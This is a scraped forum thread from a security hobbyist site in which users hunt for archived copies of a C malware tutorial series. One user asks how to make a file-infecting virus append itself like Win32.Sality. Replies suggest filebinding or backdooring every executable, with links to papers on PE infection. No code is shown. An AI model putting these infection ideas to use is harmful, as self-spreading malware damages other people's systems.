                  <time itemprop='datePublished' datetime='2016-09-25T08:16:25Z' class='post-time'>
                    September 25, 2016,  8:16am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-25T08:16:25Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hello <a class="mention" href="../../u/dtm.html">@dtm</a>  I‚Äôve been reading your Security-Oriented C tutorial since Null Byte didn‚Äôt change their theme.Since they changed the website your tutorials is lacking some parts.Like this article : <a href="../../../external.html?link=https://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xf9-spy-with-my-little-program-keylogging-101-0169950/" rel="nofollow noopener">http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xf9-spy-with-my-little-program-keylogging-101-0169950/</a></p>
<p>Not just your tutorials,OccupyTheWeb and the others‚Äô articles have same problem.</p>
<p>Where can I find your full Security-Oriented C tutorials?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-25T09:55:47Z' class='post-time'>
                    September 25, 2016,  9:55am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-25T10:02:06Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I‚Äôve discontinued that series.</p>
<p><a class="mention" href="../../u/oaktree.html">@oaktree</a> <span class="mention">@unh0lys0da</span> <a class="mention" href="../../u/pry0cc.html">@pry0cc</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tux.html'><span itemprop='name'>tux</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-25T15:26:09Z' class='post-time'>
                    September 25, 2016,  3:26pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-25T15:26:09Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>They were great series.I want to read all you‚Äôve written but not in Null Byte.So do you have word documents of these written series.If yes,can you send me please?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-26T00:12:12Z' class='post-time'>
                    September 26, 2016, 12:12am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-26T00:12:12Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I don‚Äôt have a back up of them but somebody else might. Which ones were you specifically looking for?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tux.html'><span itemprop='name'>tux</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-26T09:04:00Z' class='post-time'>
                    September 26, 2016,  9:04am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-26T09:04:00Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Especially from 0x0c tutorial to end tutorial.But if someone backed up of them I need all of them.Because they were absolutely excellent articles.I‚Äôve really liked them.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_11' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-26T10:54:30Z' class='post-time'>
                    September 26, 2016, 10:54am
                  </time>
                  <meta itemprop='dateModified' content='2016-09-26T10:54:30Z'>
              <span itemprop='position'>11</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks for the support but the series has been concluded. There are no missing articles there, only missing information on the higher numbered ones.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_12' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tux.html'><span itemprop='name'>tux</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-09-26T15:10:57Z' class='post-time'>
                    September 26, 2016,  3:10pm
                  </time>
                  <meta itemprop='dateModified' content='2016-09-26T15:10:57Z'>
              <span itemprop='position'>12</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks for your help.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_13' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Xenyth.html'><span itemprop='name'>Xenyth</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-03T12:50:45Z' class='post-time'>
                    April 3, 2017, 12:50pm
                  </time>
                  <meta itemprop='dateModified' content='2017-04-03T12:55:46Z'>
              <span itemprop='position'>13</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hello <a class="mention" href="../../u/dtm.html">@dtm</a><br>
I could find the original articles from Security-Oriented C series using ‚Äú<a href="../../../external.html?link=http://archive.org/" rel="nofollow noopener">Archive.org</a>‚Äù.<br>
And I wanted to ask you a question (sorry if I‚Äôm posting this at the wrong place).</p>
<p>In tutorial 0xFE (It lives), I tried to use append binary ‚Äúab‚Äù mode instead of ‚Äúwb‚Äù mode so that the infected file could run itself and then the virus, but only the victim file  executed.</p>
<p>Is it related to EOF at the end of the (original) infected file?<br>
How can I make it work, something like Win32.Sality?</p>
<p>Thanks for the series and I‚Äôm eagerly willing to see your answer <img src="../../../0x00sec.org/images/emoji/twitter/blushc164.html?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_14' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-03T14:42:49Z' class='post-time'>
                    April 3, 2017,  2:42pm
                  </time>
                  <meta itemprop='dateModified' content='2017-04-03T14:42:49Z'>
              <span itemprop='position'>14</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote group-VIP" data-username="dtm" data-post="11" data-topic="99" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/dtm/48/6409_2.png" class="avatar"> dtm:</div>
<blockquote>
<p>Thanks for the support but the series has been concluded. There are no missing articles there, only missing information on the higher numbered ones.</p>
</blockquote>
</aside>
<p>I don‚Äôt know if he even remembers the exact content of each article. If you can link to the article on <a href="../../../external.html?link=http://archive.org/">archive.org</a> it might give you a better chance of reply.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_15' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Xenyth.html'><span itemprop='name'>Xenyth</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-03T15:11:04Z' class='post-time'>
                    April 3, 2017,  3:11pm
                  </time>
                  <meta itemprop='dateModified' content='2017-04-03T15:11:04Z'>
              <span itemprop='position'>15</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Of course (and thanks for the advice)</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=http://web.archive.org/web/20160204032115/http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xfe-its-alive-our-first-malware-0167612/" target="_blank" rel="noopener nofollow ugc">WonderHowTo</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/323;"><img src="../../../0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_690x323.jpeg" class="thumbnail" width="690" height="323" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_690x323.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_1035x484.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a.jpeg 2x" data-small-upload="../../../0x00sec.s3.amazonaws.com/optimized/2X/d/d336d8393cc1f2b06d4f96ef26bf3dd8d5c6e66a_2_10x10.png"></div>

<h3><a href="../../../external.html?link=http://web.archive.org/web/20160204032115/http://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0xfe-its-alive-our-first-malware-0167612/" target="_blank" rel="noopener nofollow ugc">Security-Oriented C Tutorial 0xFE - It's Alive!! - Our First Malware</a></h3>

<p>Welcome, to our first malware tutorial! Just a heads up, if you have yet to complete up to and including Tutorial 0x15 - File I/O, I suggest doing so before continuing. CAUTION Before proceeding beyond this point, you must understand the risk of...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_16' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-03T15:50:04Z' class='post-time'>
                    April 3, 2017,  3:50pm
                  </time>
                  <meta itemprop='dateModified' content='2017-04-03T15:50:04Z'>
              <span itemprop='position'>16</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Please PM me with Win32.Sality‚Äôs code and I will get back to you on the NB article.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_17' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Xenyth.html'><span itemprop='name'>Xenyth</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-03T19:26:19Z' class='post-time'>
                    April 3, 2017,  7:26pm
                  </time>
                  <meta itemprop='dateModified' content='2017-04-03T19:26:19Z'>
              <span itemprop='position'>17</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Well by mentioning Sality I just wanted to give an example of a virus which doesn‚Äôt overwrite and destroy the victim file but appends to it and as the result, when you execute the infected victim file, both the victim file and the virus run.</p>
<p>But if you wish I will try to find out exactly how Sality works <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_18' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-04T06:38:48Z' class='post-time'>
                    April 4, 2017,  6:38am
                  </time>
                  <meta itemprop='dateModified' content='2017-04-04T06:38:48Z'>
              <span itemprop='position'>18</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hmm this indeed is an interesting concept. You could be mega dirty and just filebind everything. (This would break a lot too though).</p>
<p>You might be best off backdooring the program that opens those files, perhaps every executable on the system? Then when you open a text file, command prompt, or a spreadsheet, you are opening the payload too.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_19' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-04T07:54:27Z' class='post-time'>
                    April 4, 2017,  7:54am
                  </time>
                  <meta itemprop='dateModified' content='2017-04-04T07:54:27Z'>
              <span itemprop='position'>19</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Okay, I see what you mean by using mode <code>ab</code> but unfortunately, it‚Äôs not quite as simple as you think it is.</p>
<p>I‚Äôve already documented a method for this in my paper <a href="../../../external.html?link=https://0x00sec.org/t/pe-file-infection/401/25">PE File Infection</a> and have done an analysis on a simple appending virus <a href="../../../external.html?link=https://0x00sec.org/t/understanding-a-win32-virus-code-analysis/1069">Understanding a Win32 Virus: Code Analysis</a> with background material <a href="../../../external.html?link=https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043/6">Understanding a Win32 Virus: Background Material</a>.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_20' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Xenyth.html'><span itemprop='name'>Xenyth</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-04-04T11:44:05Z' class='post-time'>
                    April 4, 2017, 11:44am
                  </time>
                  <meta itemprop='dateModified' content='2017-04-04T11:44:05Z'>
              <span itemprop='position'>20</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you both of you. I will study the papers and see if I can put them into practice.<br>
Maybe I would go mega-dirty!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>

      <div role='navigation' itemscope itemtype='http://schema.org/SiteNavigationElement' class="topic-body crawler-post">
            <span itemprop='name'><b><a rel="next" itemprop="url" href="994658.html?page=2">next page ‚Üí</a></b></span>
      </div>

    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="3g561q8U6DfBq5DQVMI9iKXBh"></script>
  </body>
  
</html>
